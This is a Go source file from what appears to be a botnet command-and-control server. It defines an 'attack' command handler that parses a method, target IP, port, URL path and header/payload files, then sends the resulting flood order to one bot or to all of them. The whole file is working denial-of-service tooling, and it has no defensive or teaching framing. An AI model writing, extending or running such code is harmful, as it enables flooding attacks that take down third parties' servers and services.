package attack

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"c2/bot"
	"c2/config"
)

// LoadHeadersAndPayload reads header.txt and payload.txt from the specified folder
func LoadHeadersAndPayload(folderPath string) (string, string, error) {
	// Adjust the path to point to the config directory
	folderPath = filepath.Join(config.ConfigDir, folderPath)
	header := ""
	payload := ""

	// Load headers from header.txt (if it exists)
	headerPath := filepath.Join(folderPath, "header.txt")
	if _, err := os.Stat(headerPath); err == nil {
		headerData, err := ioutil.ReadFile(headerPath)
		if err != nil {
			return "", "", fmt.Errorf("failed to read header file: %v", err)
		}
		header = string(headerData)
	}

	// Load payload data from payload.txt (if it exists)
	payloadPath := filepath.Join(folderPath, "payload.txt")
	if _, err := os.Stat(payloadPath); err == nil {
		payloadData, err := ioutil.ReadFile(payloadPath)
		if err != nil {
			return "", "", fmt.Errorf("failed to read payload file: %v", err)
		}
		payload = string(payloadData)
	}

	return header, payload, nil
}

// HandleAttack processes the attack command
func HandleAttack(args []string) {

	// Check minimum required parameters (method, target, port)
	if len(args) < 3 {
		fmt.Println("[!] Usage: attack <method> <target IP> <port> [path] [dataFolder/botIP]")
		fmt.Printf("Available methods: %v\n", config.GetAllMethods())
		return
	}

	method := strings.ToUpper(args[0])
	target := args[1]
	port, err := strconv.Atoi(args[2])
	if err != nil {
		fmt.Println("[!] Invalid port number")
		return
	}

	// Initialize basic parameters
	path := ""  // 4th parameter: URL path or botIP
	botIP := "" // Specific bot IP (optional)

	// Default empty header and payload
	header := "" // Empty JSON object string
	payload := ""

	// Validate attack method
	if !config.IsValidMethod(method) {
		fmt.Println("[!] Invalid attack method")
		return
	}

	// Handle parameters based on attack method type
	if config.IsHTTPMethod(method) {
		// HTTP methods require path and possibly a config name
		if len(args) > 3 {
			path = args[3] // URL path
		}

		if len(args) > 4 {
			configNameOrIP := args[4]

			// Check if the config directory exists
			configPath := filepath.Join(config.ConfigDir, configNameOrIP)
			if fi, err := os.Stat(configPath); err == nil && fi.IsDir() {
				// Load headers and payload from the config directory
				var err error
				header, payload, err = LoadHeadersAndPayload(configNameOrIP)
				if err != nil {
					fmt.Printf("[!] Error loading headers and payload: %v\n", err)
					return
				}
				fmt.Printf("[+] Loaded headers and payload from config/%s/\n", configNameOrIP)
			} else {
				// Not a config name, treat as bot IP
				botIP = configNameOrIP
			}
		}

		// If there is a 6th parameter, it must be the bot IP
		if len(args) > 5 {
			botIP = args[5]
		}
	} else if config.IsLayer4Method(method) {
		// Layer4 attacks keep path/header/payload empty, any 4th parameter is treated as bot IP
		if len(args) > 3 {
			botIP = args[3]
		}
	}

	// Build the command to send to the bot (always 6 parameters)
	command := config.BotCommand{
		Method:  method,
		IP:      target,
		Port:    port,
		Path:    path,
		Header:  header,
		Payload: payload,
	}

	// Send the command to the bot
	bot.SendBotCommand(command, botIP)
}
